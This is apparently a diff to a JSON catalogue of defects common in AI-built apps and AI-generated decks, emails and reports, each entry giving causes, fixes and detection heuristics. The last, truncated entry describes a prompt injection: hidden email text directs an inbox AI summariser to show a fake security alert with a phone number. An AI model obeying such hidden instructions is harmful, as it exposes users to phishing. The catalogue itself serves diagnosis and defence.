+  "theFix": "Use one input with inputmode=\"numeric\" and autocomplete=\"one-time-code\", or a library that keeps a single input behind the visual boxes. Test paste and SMS autofill.",
+  "heur": "Count the inputs in the code entry step; more than one, without autocomplete=\"one-time-code\", is the pattern.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "SMS OTP form best practices",
+    "u": "https://web.dev/sms-otp-form"
+   },
+   {
+    "t": "Best Practices for OTP Input Forms in HTML",
+    "u": "https://www.twilio.com/en-us/blog/developers/best-practices/otp-input-forms-html"
+   }
+  ],
+  "code": "A221",
+  "rel": [
+   "inputs-with-no-edge",
+   "validation-that-lies",
+   "autofill-blind-sign-up"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-account-revealing-error",
+  "name": "The Account-Revealing Error",
+  "track": "surface",
+  "group": "Safety",
+  "category": "Forms",
+  "harm": "Privacy",
+  "origin": "Model",
+  "oneLiner": "Login and reset forms say 'No account with that email', telling anyone who is a customer.",
+  "looksLike": "Type a stranger's email on the login page and the form says 'No user found' or 'Wrong password' depending on whether they have an account. The reset form says 'We sent a link' for members and 'Email not registered' for everyone else.",
+  "why": "Hosted auth services return one generic 'Invalid login credentials' on purpose. When a model writes custom auth or 'improves' the error copy to be more helpful, it splits the cases, because specific messages read as better UX in its training data.",
+  "who": "Users of sensitive products (health, debt, dating) can be identified by anyone who knows their email, and attackers get a list of valid accounts.",
+  "theFix": "Use one message for all failed logins and the same 'If an account exists, we sent a link' for resets and sign-ups. Keep response times equal too.",
+  "heur": "Try the login and reset forms with a real and a made-up email and compare the messages.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Testing for User Enumeration and Guessable User Account (OWASP-AT-002)",
+    "u": "https://wiki.owasp.org/index.php/Testing_for_user_enumeration_(OWASP-AT-002)"
+   },
+   {
+    "t": "Why Supabase, Firebase, and Auth0 Obfuscate Authentication Errors",
+    "u": "https://zenn.dev/kaji_kaji/articles/baas-auth-error-design?locale=en"
+   }
+  ],
+  "code": "A222",
+  "rel": [
+   "validation-that-lies",
+   "inputs-with-no-edge",
+   "red-before-you-finish"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-day-before-date",
+  "name": "The Day-Before Date",
+  "track": "surface",
+  "group": "Input & feedback",
+  "category": "Data",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "A stored date shows up one day early for everyone west of UTC.",
+  "looksLike": "You pick 21 July as a due date or birthday, save, and the list shows 20 July. Users in Europe see the right date while users in the Americas do not, so bug reports look random.",
+  "why": "Generated code parses date-only strings with new Date('2026-07-21'), which JavaScript treats as midnight UTC, then formats it in local time. The bug is invisible on the developer's machine if it sits at or east of UTC.",
+  "who": "Users miss deadlines, bookings and payments because the app shows the wrong day.",
+  "theFix": "Keep date-only values as strings or parse them with the (year, month, day) constructor or a date library, and test with the browser set to a negative UTC offset.",
+  "heur": "Search for new Date( called on 'YYYY-MM-DD' strings, and view saved dates with the system time zone set to America/Los_Angeles.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Date and time | GitLab Docs",
+    "u": "https://docs.gitlab.com/ee/development/fe_guide/date_and_time.html"
+   },
+   {
+    "t": "Your JS Date Is Lying to You",
+    "u": "https://dev.to/gkoos/your-js-date-is-lying-to-you-20n2"
+   }
+  ],
+  "code": "A223",
+  "rel": [
+   "the-deadline-modal",
+   "demo-data-masquerade",
+   "cross-my-heart"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-developer-facing-error-page",
+  "name": "The Developer-Facing Error Page",
+  "track": "surface",
+  "group": "Input & feedback",
+  "category": "Error-handling",
+  "harm": "Credibility",
+  "origin": "Tool default",
+  "oneLiner": "Customers hit the framework's built-in error or 404 screen, written for the developer.",
+  "looksLike": "A broken link shows a bare '404 - This page could not be found.' in black on white, or a router page titled 'Application Error!' with a stack trace. There is no logo, no navigation and no way back except the browser button.",
+  "why": "Frameworks ship a fallback error page so development is not blocked, and React Router's own docs call its default 'ugly and not intended for end-user consumption'. AI generators build the routes they were asked for and rarely add a root error element or not-found page.",
+  "who": "Visitors from an old or mistyped link see an unbranded dead end and leave.",
+  "theFix": "Add a root not-found page and error boundary in the app's own design, with a plain message, a search box or home link, and a way to report the problem.",
+  "heur": "Visit /this-does-not-exist and force an error; check whether the page carries the product's layout and a way forward.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "errorElement v6.30.6 | React Router",
+    "u": "https://reactrouter.com/v6/route/error-element"
+   },
+   {
+    "t": "How to Add a Custom 404 Page in Next.js",
+    "u": "https://www.cybrosys.com/blog/how-to-add-a-custom-404-page-in-nextjs"
+   }
+  ],
+  "code": "A224",
+  "rel": [
+   "one-bad-record-white-screen",
+   "everything-is-200",
+   "promo-voice-in-the-error"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-empty-state-flash",
+  "name": "The Empty-State Flash",
+  "track": "surface",
+  "group": "Input & feedback",
+  "category": "States",
+  "harm": "Trust",
+  "origin": "Model",
+  "oneLiner": "'You have no projects yet' flashes on screen while the user's projects are still loading.",
+  "looksLike": "On every page load, the empty state with its 'Create your first project' illustration appears for a second, then the real list pops in. On slow connections the user starts creating a duplicate.",
+  "why": "Generated components initialise data as an empty array and render the empty state when the array has no items, without tracking a separate loading flag. NN/g warns that showing 'No records' while content is loading makes users conclude the data does not exist.",
+  "who": "Users briefly believe their data is gone, and some act on it.",
+  "theFix": "Track loading, error and loaded separately, and only show the empty state once a load has finished with zero items.",
+  "heur": "Throttle the network and reload; watch whether the empty state appears before the data.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Designing Empty States in Complex Applications: 3 Guidelines",
+    "u": "https://www.nngroup.com/articles/empty-state-interface-design/"
+   }
+  ],
+  "code": "A225",
+  "rel": [
+   "no-results-for-everything",
+   "blank-page-no-instructions",
+   "the-spinner-that-never-fails"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-localhost-confirmation-link",
+  "name": "The Localhost Confirmation Link",
+  "track": "behavioral",
+  "group": "Input & feedback",
+  "category": "Onboarding",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "The sign-up confirmation email sends real users to http://localhost:3000.",
+  "looksLike": "A new user signs up, gets the 'Confirm your signup' email and taps the link. The browser tries to open localhost:3000 and shows 'This site can't be reached'. Password reset and magic links fail the same way.",
+  "why": "Supabase sends confirmation, reset and magic links to the project's Site URL, and that setting defaults to localhost:3000. AI builders wire up sign-up against the backend in minutes but leave the dashboard setting untouched, so the app works in the builder preview and breaks for the first real user.",
+  "who": "New users cannot finish signing up, and most assume the product is broken rather than retrying.",
+  "theFix": "Set the Site URL to the live https domain and add every deploy and preview domain to the allowed Redirect URLs before launch. Then sign up with a fresh address and click the link on a phone.",
+  "heur": "Sign up with a new email on the live site and check whether the link in the confirmation email points at localhost or a preview domain.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Password-based Auth | Supabase Docs",
+    "u": "https://supabase.com/docs/guides/auth/auth-email"
+   },
+   {
+    "t": "Redirect URLs | Build | Rocket.new",
+    "u": "https://docs.rocket.new/build/connectors/supabase/redirect-urls"
+   }
+  ],
+  "code": "B214",
+  "rel": [
+   "the-scanner-eaten-magic-link",
+   "the-wrong-browser-magic-link",
+   "two-emails-an-hour"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-scanner-eaten-magic-link",
+  "name": "The Scanner-Eaten Magic Link",
+  "track": "behavioral",
+  "group": "Input & feedback",
+  "category": "Onboarding",
+  "harm": "Productivity",
+  "origin": "Tool default",
+  "oneLiner": "Corporate email scanners click the one-time sign-in link first, so the user's click says 'expired'.",
+  "looksLike": "A user at a company, school or hospital requests a magic link, clicks it within seconds, and lands on 'Email link is invalid or has expired'. Requesting another link gives the same result every time. Users on personal Gmail never see the problem.",
+  "why": "One-time links are consumed on the first GET request, and enterprise mail security tools prefetch every link to check it. AI-built apps often ship magic links as the only sign-in method because it is the shortest auth flow to generate, with no fallback such as a typed code.",
+  "who": "Business users, the people most likely to pay, are locked out with no explanation.",
+  "theFix": "Send a six-digit code alongside or instead of the link, or make the link open a page with a button that does the sign-in on click. Show a clear 'request a code instead' path on the expired-link screen.",
+  "heur": "Check whether the email link signs the user in on a plain GET with no further click, and whether the expired-link page offers any alternative.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Magic links and password reset tokens consumed by email scanners in institutional environments",
+    "u": "https://github.com/orgs/supabase/discussions/41618"
+   },
+   {
+    "t": "OTP Verification Failures: 'token has expired' or 'otp_expired' errors",
+    "u": "https://supabase.com/docs/guides/troubleshooting/otp-verification-failures-token-has-expired-or-otp_expired-errors-5ee4d0.md"
+   }
+  ],
+  "code": "B215",
+  "rel": [
+   "the-wrong-browser-magic-link",
+   "the-localhost-confirmation-link",
+   "sign-up-to-see-anything"
+  ],
+  "tier": "needed",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-silent-spinner",
+  "name": "The Silent Spinner",
+  "track": "surface",
+  "group": "Accessibility",
+  "category": "States",
+  "harm": "Accessibility",
+  "origin": "Model",
+  "oneLiner": "Loading, saving and result counts change on screen but are never announced to screen readers.",
+  "looksLike": "A sighted user sees a spinner, then 'Saved' or '18 results'. A screen reader user hears nothing, so they do not know whether the search ran, the save worked or the page is still busy.",
+  "why": "Generated loading and success indicators are visual only: a spinner icon, a swapped label, a count. WCAG 4.1.3 asks for such status messages to be exposed with a live region, and models seldom add role=\"status\" or aria-busy.",
+  "who": "Screen reader users wait, repeat actions or give up because the interface gives them no feedback.",
+  "theFix": "Put loading text, result counts and save confirmations in a polite live region (role=\"status\"), and mark busy regions with aria-busy.",
+  "heur": "Search the code for role=\"status\", aria-live or aria-busy near spinners and result counts; none is the pattern.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Understanding Success Criterion 4.1.3: Status Messages | WAI | W3C",
+    "u": "https://www.w3.org/WAI/WCAG21/Understanding/status-messages.html"
+   }
+  ],
+  "code": "A226",
+  "rel": [
+   "the-spinner-that-never-fails",
+   "the-empty-state-flash",
+   "content-stuck-waiting-to-appear"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-wrong-browser-magic-link",
+  "name": "The Wrong-Browser Magic Link",
+  "track": "behavioral",
+  "group": "Input & feedback",
+  "category": "Onboarding",
+  "harm": "Productivity",
+  "origin": "Tool default",
+  "oneLiner": "The sign-in link only works in the browser that asked for it, and the error says nothing useful.",
+  "looksLike": "The user requests a link on a laptop and opens the email on a phone, or taps it inside Gmail's in-app browser. The page shows a raw 'both auth code and code verifier should be non-empty' error or a blank screen. Nothing suggests opening the link elsewhere.",
+  "why": "With the PKCE flow the code verifier is stored as a cookie in the browser that started sign-in, so any other browser cannot complete the exchange. Generated callback routes call exchangeCodeForSession on the happy path and do not catch the thrown error or offer a recovery step.",
+  "who": "Mobile users and anyone who reads email on a different device than they browse on are stuck at the front door.",
+  "theFix": "Catch the exchange error and show a plain screen: 'Open this link in the browser where you requested it, or get a new code here.' Offer a typed one-time code as a cross-device fallback.",
+  "heur": "Request a magic link on desktop, open it on a phone, and read what the callback page shows.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Supabase Auth helpers issue #545: both auth code and code verifier should be non-empty",
+    "u": "https://github.com/supabase/auth-helpers/issues/545"
+   },
+   {
+    "t": "Fix: auth code and code verifier should be non-empty",
+    "u": "https://www.guardlayer.io/blog/supabase-pkce-code-verifier-errors"
+   }
+  ],
+  "code": "B216",
+  "rel": [
+   "the-scanner-eaten-magic-link",
+   "the-tour-that-explains-nothing",
+   "the-localhost-confirmation-link"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "two-emails-an-hour",
+  "name": "Two Emails An Hour",
+  "track": "behavioral",
+  "group": "Input & feedback",
+  "category": "Onboarding",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "Sign-up and reset emails go through the backend's test mail service and silently stop after a few sends.",
+  "looksLike": "Sign-up appears to succeed and the screen says 'Check your email', but nothing arrives. Password resets vanish too. The only trace is an 'email rate limit exceeded' error that the UI swallows or shows raw.",
+  "why": "Supabase's built-in email service is meant for testing, is limited to a handful of emails per hour across the whole project and may only deliver to team addresses. AI builders connect auth without asking for a custom SMTP provider, so the launch day traffic hits the limit within minutes.",
+  "who": "Every new user after the first few cannot verify their account, and the founder sees no error on their own account.",
+  "theFix": "Configure a real SMTP provider with your own sending domain before launch, raise the auth email rate limit, and show a clear message with a resend timer when sending fails.",
+  "heur": "Check the auth settings for a custom SMTP host; if none is set, the app is on the test mail service.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Supabase email rate limit",
+    "u": "https://flaviocopes.com/supabase-email-rate-limit.md"
+   },
+   {
+    "t": "Supabase Custom SMTP and Email Configuration Guide",
+    "u": "https://sendlayer.com/blog/supabase-custom-smtp-and-email-configuration-guide/"
+   }
+  ],
+  "code": "B217",
+  "rel": [
+   "the-localhost-confirmation-link",
+   "sign-up-to-see-anything",
+   "the-scanner-eaten-magic-link"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "upload-limit-found-by-failing",
+  "name": "Upload Limit Found By Failing",
+  "track": "surface",
+  "group": "Input & feedback",
+  "category": "Forms",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "The upload box accepts any file, then fails after the wait with a vague error.",
+  "looksLike": "A user drags in a phone video, watches a spinner for a minute, and gets 'Upload failed' or a raw 'Payload too large'. The size limit and allowed types are written nowhere near the box.",
+  "why": "Generated upload code passes the file straight to storage without checking size or type first, and hosted storage enforces plan limits, such as 50 MB per file on Supabase's free tier, only at the server. The demo used a small image, so the limit never showed.",
+  "who": "Users waste time and data on uploads that were never going to work.",
+  "theFix": "Show the size and type limits next to the picker, check file.size and type before uploading, show progress, and explain what to do when a file is too large.",
+  "heur": "Check whether the upload handler compares file.size and file.type before calling storage, and try a file above the plan limit.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Limits | Supabase Docs",
+    "u": "https://supabase.com/docs/guides/storage/uploads/file-limits"
+   }
+  ],
+  "code": "A227",
+  "rel": [
+   "red-before-you-finish",
+   "feedback-black-hole",
+   "ambiguous-wait"
+  ],
+  "tier": "needed",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "bullets-of-equal-length",
+  "name": "Bullets Of Equal Length",
+  "track": "surface",
+  "group": "Layout",
+  "category": "Slides",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Every slide is a title and four bullets, each six to eight words long, in the same rhythm.",
+  "looksLike": "Bullet after bullet starts the same way, is the same length and carries the same weight. No bullet is clearly more important than the others. Across twenty slides the pattern never breaks.",
+  "why": "Models balance list items by default, and deck generators fill a fixed text-box template on every slide. Reviewers of AI decks name identical bullet rhythm as one of the clearest tells.",
+  "who": "Audiences cannot tell which point matters, and the deck reads as filler.",
+  "theFix": "Tell the tool to vary structure by content: one key sentence, a chart, or a short list only where items are truly parallel. Cut bullets that restate the title.",
+  "heur": "Measure bullets per slide and word count per bullet; flag decks where more than 70% of slides have 3 to 5 bullets with a word-count spread under 4.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "12 Common Mistakes with AI-Generated Presentations (And How to Fix Each)",
+    "u": "https://2slides.com/blog/common-mistakes-ai-generated-presentations"
+   },
+   {
+    "t": "How to Make AI Slides That Don't Look AI-Generated (2026 Guide)",
+    "u": "https://2slides.com/blog/can-ai-make-slides-that-dont-look-ai-generated"
+   }
+  ],
+  "code": "A228",
+  "rel": [
+   "one-layout-deck",
+   "twenty-slides-saying-little",
+   "export-breaks-the-deck"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "citation-residue",
+  "name": "Citation Residue",
+  "track": "surface",
+  "group": "Provenance",
+  "category": "Documents",
+  "harm": "Credibility",
+  "origin": "Tool default",
+  "oneLiner": "Pasted AI text keeps chatbot citation markers like 'oaicite' or ':contentReference[oaicite:0]{index=0}'.",
+  "looksLike": "Strings such as ':contentReference[oaicite:0]{index=0}' appear at the end of a paragraph, script or JSON block. Reference URLs carry 'oaicite' or chatbot tracking parameters. The markers show up in reports, emails and documents after copy and paste.",
+  "why": "Chat products insert internal citation tokens when they use web search, and these survive copying into other tools. A government report in 2025 included references with 'oaicite' attached to URLs, which reporters read as a sign of OpenAI tool use.",
+  "who": "Readers learn the text was pasted without review, and every claim nearby loses credibility.",
+  "theFix": "Strip chatbot citation tokens and tracking parameters before publishing, and replace them with real, checked references.",
+  "heur": "Regex the document for /oaicite|contentReference\\[|turn\\d+search\\d+|utm_source=chatgpt/ in text and link URLs.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Why is ChatGPT adding content references?",
+    "u": "https://community.openai.com/t/why-is-chatgpt-adding-content-references/1076836"
+   },
+   {
+    "t": "RFK Jr.’s MAHA Commission report on childhood chronic illness misinterpreted research and cited studies that don’t exist",
+    "u": "https://www.risehealth.org/insights-articles/rfk-jr-s-maha-commission-report-on-childhood-chronic-illness-misinterpreted-research-and-cited-studies-that-don-t-exist"
+   }
+  ],
+  "code": "A229",
+  "rel": [
+   "fabricated-footnotes",
+   "the-confident-blank",
+   "the-footnote-disclaimer"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "default-theme-deck",
+  "name": "Default Theme Deck",
+  "track": "surface",
+  "group": "Colour & type",
+  "category": "Slides",
+  "harm": "Credibility",
+  "origin": "Tool default",
+  "oneLiner": "An AI-generated company deck uses the tool's default fonts, purple gradient and mid palette instead of the brand.",
+  "looksLike": "The deck has a tool font, a purple-to-blue gradient title slide and safe muted colours. The logo is pasted on but nothing else matches the company's template. Footers and page numbers appear on some slides and not others.",
+  "why": "AI deck tools start from their own themes, and copilots pick up a template only if one is selected and do little to enforce brand rules. Reviews list default fonts, colours and layouts that do not match brand identity, and inconsistent footers as a sign no final pass happened.",
+  "who": "The organisation looks inconsistent to clients, and staff spend time re-skinning decks.",
+  "theFix": "Start from your brand template or brand kit in the tool and lock its fonts and colours. Check footers and slide numbers in a final pass.",
+  "heur": "Compare deck fonts and colours with the brand palette; flag gradients not in the palette and footers missing from more than 10% of content slides.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Common Mistakes When Using AI Presentation Makers and How to Avoid Them",
+    "u": "https://www.slidesai.io/blog/common-ai-presentation-mistakes"
+   },
+   {
+    "t": "Microsoft Copilot review for presentations: features, pricing & limitations",
+    "u": "https://www.prezent.ai/blog/microsoft-copilot-review"
+   },
+   {
+    "t": "How to Make AI Slides That Don't Look AI-Generated (2026 Guide)",
+    "u": "https://2slides.com/blog/can-ai-make-slides-that-dont-look-ai-generated"
+   },
+   {
+    "t": "Create a new presentation with Copilot in PowerPoint",
+    "u": "https://support.microsoft.com/en-us/copilot-powerpoint"
+   }
+  ],
+  "code": "A230",
+  "rel": [
+   "export-breaks-the-deck",
+   "speaker-notes-that-echo",
+   "topic-label-titles"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "div-soup-email",
+  "name": "Div Soup Email",
+  "track": "surface",
+  "group": "Layout",
+  "category": "Email",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "An AI-coded HTML email looks perfect in the browser preview and collapses in Outlook.",
+  "looksLike": "In classic Outlook the layout stretches to the window edges, columns stack in the wrong order, and fonts fall back to Times New Roman. Rounded buttons turn square or lose their background. The same email looks fine in Apple Mail and the generator's preview.",
+  "why": "Models write email the way they write web pages: divs, flexbox, grid, max-width and web fonts. Classic Outlook renders HTML with the Word engine and ignores much of that CSS, and a browser preview hides the problem. Tests of ChatGPT, Claude and Gemini found Outlook issues in eight of nine generated emails.",
+  "who": "Recipients on Outlook, often the corporate audience being targeted, get a broken email, and the sender pays for slow repair work.",
+  "theFix": "Tell the model to build with nested tables, inline styles, explicit widths and bulletproof or VML buttons, and to avoid flexbox and grid. Test in real clients, including classic Outlook, before sending.",
+  "heur": "Parse the email HTML for display:flex, display:grid, max-width on tables or divs used as layout containers without table fallbacks; render in Outlook 2016 or later to confirm.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Assessing ChatGPT, Claude, and Gemini for HTML Email Creation",
+    "u": "https://knak.com/blog/testing-llms-html-email-creation/"
+   },
+   {
+    "t": "AI-Generated Email Templates with React Email",
+    "u": "https://vp0.com/blogs/ai-generated-email-templates-react-email"
+   },
+   {
+    "t": "How to Fix Broken Emails in Outlook, Gmail, and Dark Mode",
+    "u": "https://migma.ai/blog/how-to-fix-broken-emails-in-outlook-gmail-and-dark-mode"
+   }
+  ],
+  "code": "A231",
+  "rel": [
+   "no-plain-text-twin",
+   "invisible-instructions",
+   "permission-to-close-your-file"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "export-breaks-the-deck",
+  "name": "Export Breaks The Deck",
+  "track": "surface",
+  "group": "Layout",
+  "category": "Slides",
+  "harm": "Productivity",
+  "origin": "Tool default",
+  "oneLiner": "A deck that looked clean in the AI tool arrives cropped, re-fonted and split into loose text boxes.",
+  "looksLike": "In PowerPoint or Google Slides, content runs off the slide edge, tables become separate text boxes, and the default web font is replaced. Every bullet is its own box, so editing one list means fixing each line. Backgrounds may be missing.",
+  "why": "Card-based AI deck tools design on a flexible canvas that does not match fixed slide sizes, and export converts their layout to many positioned boxes. Users have requested better export fidelity for cropping, lost tables and font problems, and the tool's own help notes font substitution and missing backgrounds.",
+  "who": "Whoever has to present or edit the deck in corporate PowerPoint loses hours rebuilding it.",
+  "theFix": "Check the export target before building, set fonts available in PowerPoint, and export and review early rather than at the end.",
+  "heur": "Open the exported PPTX and count text boxes per slide and shapes outside slide bounds; flag slides with more than 10 text boxes or any overflow.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Improve powerpoint and google slides export quality",
+    "u": "https://ideas.gamma.app/ideas/p/text-exports-to-powerpoint-as-line-by-line-instead-of-one-big-text-box"
+   },
+   {
+    "t": "Why doesn't my exported PDF or PowerPoint match what I see in Gamma?",
+    "u": "https://help.gamma.app/en/articles/15939201-why-doesnt-my-exported-pdf-or-powerpoint-match-what-i-see-in-gamma"
+   }
+  ],
+  "code": "A232",
+  "rel": [
+   "one-layout-deck",
+   "twenty-slides-saying-little",
+   "bullets-of-equal-length"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "fabricated-footnotes",
+  "name": "Fabricated Footnotes",
+  "track": "surface",
+  "group": "Provenance",
+  "category": "Documents",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "An AI-assisted report cites studies, books or court rulings that do not exist.",
+  "looksLike": "The reference list looks complete, with authors, journals, years and DOIs. Some titles cannot be found anywhere, some DOIs or ISBNs resolve to nothing, and a quote is attributed to a judgment that never said it. The errors surface only when someone checks.",
+  "why": "Language models generate references that match the pattern of real citations without retrieving them. In 2025 Deloitte agreed to partially refund the Australian government over a report with non-existent research references and a fabricated court quote, and a US government health report cited studies that do not exist.",
+  "who": "Decision makers act on evidence that is not there, and the author's organisation takes the reputational and financial hit.",
+  "theFix": "Verify every reference by opening it before publishing, and tell the tool to cite only sources you supplied. Keep a log of who checked each citation.",
+  "heur": "Resolve every DOI, ISBN and URL in the bibliography and search each title; flag any that fail to resolve or match a different work.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Deloitte to partially refund Australian government for report with apparent AI-generated errors",
+    "u": "https://www.ctvnews.ca/business/article/deloitte-to-partially-refund-australian-government-for-report-with-apparent-ai-generated-errors/"
+   },
+   {
+    "t": "RFK Jr.’s MAHA Commission report on childhood chronic illness misinterpreted research and cited studies that don’t exist",
+    "u": "https://www.risehealth.org/insights-articles/rfk-jr-s-maha-commission-report-on-childhood-chronic-illness-misinterpreted-research-and-cited-studies-that-don-t-exist"
+   },
+   {
+    "t": "The subtle signs that give away chatbot writing, according to Wikipedia",
+    "u": "https://www.techspot.com/news/109186-subtle-signs-give-away-chatbot-writing-according-wikipedia.html"
+   }
+  ],
+  "code": "A233",
+  "rel": [
+   "citation-residue",
+   "the-footnote-disclaimer",
+   "confidence-theatre"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "hope-this-finds-you-well",
+  "name": "Hope This Finds You Well",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Email",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "AI-drafted emails open with 'I hope this finds you well' and close with 'Don't hesitate to reach out.'",
+  "looksLike": "The first line is a pleasantry with no content, often followed by 'I wanted to reach out'. The last line invites contact the reader never needed permission for. Between them the tone is formal and memo-like, even when the sender normally writes 'hey'.",
+  "why": "These stock phrases are among the most frequent openers and closers in business email, so models trained on that text default to them. Writing guides now note that many AI-generated emails use this opener or a close synonym.",
+  "who": "Readers skim past or delete the message, and the sender sounds like everyone else using the same tool.",
+  "theFix": "Tell the tool to start with the reason for writing in the first sentence and end with one concrete next step. Ban the phrases 'hope this finds you well', 'wanted to reach out' and 'don't hesitate'.",
+  "heur": "Text match the first and last 25 words for /hope (this|you).{0,20}(finds|well)|wanted to reach out|(do not|don't) hesitate/i.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "“I Hope This Email Finds You Well” Meaning and Alternatives",
+    "u": "https://www.grammarly.com/blog/writing-tips/i-hope-this-email-finds-you-well/"
+   },
+   {
+    "t": "How to Recognize an Email Written by an AI Language Model (August 2024)",
+    "u": "https://rajiv.com/blog/2024/08/29/how-to-recognize-an-email-written-by-an-ai-language-model-august-2024/"
+   },
+   {
+    "t": "Humanize AI Emails | Prompts for Emails That Sound Like You",
+    "u": "https://www.promptoptimizer.tools/prompts/humanize-ai-text/humanize-ai-emails"
+   }
+  ],
+  "code": "A234",
+  "rel": [
+   "permission-to-close-your-file",
+   "the-sender-first-pitch",
+   "the-buried-ask"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "icons-that-mean-nothing",
+  "name": "Icons That Mean Nothing",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Slides",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "Each bullet on an AI slide gets a generic icon from the default pack that adds no meaning.",
+  "looksLike": "A lightbulb next to 'Ideas', a gear next to 'Process', a target next to 'Goals'. The same icon set appears in every AI deck. Remove the icons and nothing is lost.",
+  "why": "Deck generators auto-assign icons from their built-in library to list items by keyword so slides look designed. The result is the same icons across every deck made with the same tool.",
+  "who": "Audiences gain nothing from the icons, and the deck looks templated and generic.",
+  "theFix": "Remove icons unless each one helps the reader find or recognise something, and use one consistent set chosen for the brand.",
+  "heur": "Count icons per slide; flag when every list item has an icon and icons repeat the literal meaning of their label.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "How to Make AI Slides That Don't Look AI-Generated (2026)",
+    "u": "https://www.chatslide.ai/guides/how-to-make-ai-slides-not-look-ai-generated"
+   },
+   {
+    "t": "12 Common Mistakes with AI-Generated Presentations (And How to Fix Each)",
+    "u": "https://2slides.com/blog/common-mistakes-ai-generated-presentations"
+   }
+  ],
+  "code": "A235",
+  "rel": [
+   "the-handshake-slide",
+   "bullets-of-equal-length",
+   "speaker-notes-that-echo"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "invisible-instructions",
+  "name": "Invisible Instructions",
+  "track": "behavioral",
+  "group": "Safety",
+  "category": "Email",
+  "harm": "Safety",
+  "origin": "Model",
+  "oneLiner": "An email hides white or zero-size text that tells the recipient's AI summariser to show a fake security alert.",
+  "looksLike": "The email looks like a short ordinary message with no links or attachments. When the user asks the inbox AI to summarise it, the summary includes a warning that their password is compromised and a support phone number to call. The instruction was in the HTML all along, invisible to the reader.",
